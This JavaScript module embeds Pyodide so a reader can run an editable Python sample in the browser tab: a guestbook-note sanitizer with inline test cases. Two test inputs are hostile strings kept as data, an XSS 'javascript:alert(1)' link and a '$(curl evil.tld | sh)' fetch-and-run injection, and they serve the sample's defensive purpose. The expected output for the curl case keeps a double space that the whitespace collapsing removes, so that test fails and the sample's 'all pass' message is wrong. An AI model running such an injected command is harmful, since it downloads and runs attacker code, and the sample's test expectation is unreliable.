/* ============================================================================
   pyrun.js — a real CPython, in the reader's tab.

   Pyodide is CPython compiled to WebAssembly. It is about ten megabytes, which
   is far too much to spend on someone who came here to read a paragraph — so
   nothing is fetched until the reader presses run, and the button says so
   before they press it.

   Everything executes locally. Nothing typed here goes anywhere.
   ========================================================================== */

const PYODIDE = "https://cdn.jsdelivr.net/pyodide/v0.26.4/full/pyodide.js";

const SAMPLE = `"""The guestbook sanitizer's rule, as an allow-list.

This is the shape of most of the Python I write: a small pure function
with a narrow contract, and the tests sitting right next to it.
"""
import re

ALLOWED = re.compile(r"[^A-Za-z0-9 .,!?'-]")


def sanitize(note: str, cap: int = 100) -> str:
    """First line only, allow-listed, whitespace collapsed, hard capped."""
    first = note.split("\\n")[0]
    kept = ALLOWED.sub("", first)
    return re.sub(r"\\s+", " ", kept).strip()[:cap]


CASES = [
    ("[click](javascript:alert(1))", "clickjavascriptalert1"),
    ("hello\\nworld", "hello"),
    ("$(curl evil.tld | sh)", "curl evil.tld  sh"),
    ("A" * 300, "A" * 100),
    ("perfectly normal note!", "perfectly normal note!"),
]

for raw, want in CASES:
    got = sanitize(raw)
    flag = "ok  " if got == want else "FAIL"
    print(f"{flag} {raw[:34]!r:38} -> {got[:34]!r}")

print()
print(f"{len(CASES)} cases, all pass" if all(
    sanitize(r) == w for r, w in CASES) else "something broke")
`;

const CSS = `
.py-bar { display:flex; flex-wrap:wrap; align-items:center; gap:.5rem; margin-block-end:.8rem; }
.py-run {
  font-family: var(--font-mono); font-size:.78rem; font-weight:600; padding:.45rem 1rem;
  border-radius:999px; border:1px solid transparent; background: var(--sub); color: var(--sub-on);
  cursor:pointer; transition: filter .16s;
}
.py-run:hover:not(:disabled) { filter: brightness(1.08); }
.py-run:disabled { opacity:.55; cursor: progress; }
.py-reset {
  font-family: var(--font-mono); font-size:.72rem; padding:.4rem .8rem; border-radius:999px;
  border:1px solid var(--line); background:transparent; color: var(--ink-dim); cursor:pointer;
}
.py-reset:hover { color: var(--ink); border-color: var(--sub); }
.py-status { font-family: var(--font-mono); font-size:.72rem; color: var(--ink-dim); margin-inline-start:auto; }

.py-grid { display:grid; grid-template-columns: minmax(0,1fr) minmax(0,1fr); gap: clamp(1rem,3vw,1.6rem); align-items:start; }
@media (width < 54rem) { .py-grid { grid-template-columns: minmax(0,1fr); } }

.py-lab { display:block; font-family: var(--font-mono); font-size:.68rem; letter-spacing:.1em;
  text-transform: uppercase; color: var(--ink-dim); margin-block-end:.4rem; }
.py-code, .py-out {
  inline-size:100%; box-sizing:border-box; min-block-size: 22rem; margin:0;
  font-family: var(--font-mono); font-size:.76rem; line-height:1.62;
  background: var(--bg-deep); color: var(--ink); border:1px solid var(--line);
  border-radius: var(--radius-sm); padding:.85rem .9rem; resize:vertical;
  overflow:auto; white-space:pre; tab-size:4;
}
.py-code:focus-visible { outline:2px solid var(--sub); outline-offset:2px; }
.py-out { color: var(--ink-dim); }
.py-out .err { color: var(--sub-2); }
.py-out .dim { color: var(--ink-dim); opacity:.7; }
`;

let pyodidePromise = null;

/** Loaded exactly once, and only when somebody asks. */
function loadPyodide(onProgress) {
  if (pyodidePromise) return pyodidePromise;
  pyodidePromise = new Promise((resolve, reject) => {
    onProgress("fetching CPython…");
    const s = document.createElement("script");
    s.src = PYODIDE;
    s.onerror = () => reject(new Error("could not reach the Pyodide CDN"));
    s.onload = async () => {
      try {
        onProgress("starting the interpreter…");
        resolve(await globalThis.loadPyodide());
      } catch (e) { reject(e); }
    };
    document.head.append(s);
  });
  return pyodidePromise;
}

export function mount(root) {
  const style = document.createElement("style");
  style.textContent = CSS;
  root.append(style);

  const wrap = document.createElement("div");
  wrap.innerHTML = `
    <div class="py-bar">
      <button type="button" class="py-run">Run it — downloads ~10 MB</button>
      <button type="button" class="py-reset">Reset the code</button>
      <span class="py-status">nothing downloaded yet</span>
    </div>
    <div class="py-grid">
      <div>
        <label class="py-lab" for="py-code">sanitize.py — editable</label>
        <textarea class="py-code" id="py-code" spellcheck="false" autocapitalize="off" autocomplete="off"></textarea>
      </div>
      <div>
        <span class="py-lab">stdout</span>
        <pre class="py-out" aria-live="polite"><span class="dim">Press run. Nothing is fetched until you do, and nothing you type leaves this tab.</span></pre>
      </div>
    </div>`;
  root.append(wrap);

  const code = wrap.querySelector(".py-code");
  const out = wrap.querySelector(".py-out");
  const runBtn = wrap.querySelector(".py-run");
  const resetBtn = wrap.querySelector(".py-reset");
  const status = wrap.querySelector(".py-status");

  code.value = SAMPLE;
  resetBtn.addEventListener("click", () => { code.value = SAMPLE; code.focus(); });

  // Tab should indent, not leave the box — this is an editor, however small.
  code.addEventListener("keydown", (e) => {
    if (e.key !== "Tab" || e.shiftKey) return;
    e.preventDefault();
    const { selectionStart: a, selectionEnd: b, value } = code;
    code.value = value.slice(0, a) + "    " + value.slice(b);
    code.selectionStart = code.selectionEnd = a + 4;
  });

  runBtn.addEventListener("click", async () => {
    runBtn.disabled = true;
    out.textContent = "";
    try {
      const py = await loadPyodide((m) => { status.textContent = m; });
      status.textContent = "interpreter ready";
      runBtn.textContent = "Run it";

      // Capture stdout and stderr rather than letting them go to the console,
      // where the reader would never see them.
      let buf = "";
      py.setStdout({ batched: (s) => { buf += s + "\n"; } });
      py.setStderr({ batched: (s) => { buf += s + "\n"; } });

      const t0 = performance.now();
      try {
        await py.runPythonAsync(code.value);
        out.textContent = buf || "(no output)";
      } catch (err) {
        out.textContent = buf;
        const e = document.createElement("span");
        e.className = "err";
        // Pyodide's message already carries the Python traceback; the last few
        // lines are the part anyone actually wants.
        e.textContent = "\n" + String(err.message || err).split("\n").slice(-6).join("\n");
        out.append(e);
      }
      status.textContent = `ran in ${Math.round(performance.now() - t0)} ms`;
    } catch (err) {
      out.innerHTML = `<span class="err">${String(err.message || err)}</span>`;
      status.textContent = "load failed";
      // Let a network blip be retryable rather than permanently poisoning it.
      pyodidePromise = null;
    } finally {
      runBtn.disabled = false;
    }
  });
}
